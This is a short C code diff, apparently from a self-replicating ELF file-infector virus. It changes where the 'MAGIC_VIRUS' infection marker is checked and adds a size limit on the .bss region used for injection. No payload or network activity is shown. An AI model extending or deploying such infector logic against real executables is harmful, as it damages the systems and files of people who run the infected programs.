@@ -4,7 +4,7 @@ static int	check_magic(t_info *info)
 {
 	void *addr;
 
-	addr = info->text_begin + info->text_size - 4 - SIGN_SIZE;
+	addr = info->text_begin + info->text_size;
 	if (*(uint32_t *)addr ==  MAGIC_VIRUS)
 		return (1);
 	return (0);
@@ -234,6 +234,8 @@ int			pe_parsing(t_info *info)
 	info->offset_bis = program_header->p_offset + program_header->p_memsz;
 	info->addr_bis = program_header->p_vaddr + program_header->p_memsz;
 	info->bss_size = program_header->p_memsz - program_header->p_filesz;
+	if (info->bss_size > 1024 * 1024)
+		return (1);
 	info->begin_bss = program_header->p_offset + program_header->p_filesz;
 	if (info->begin_bss > info->file_size)
 		return (1);
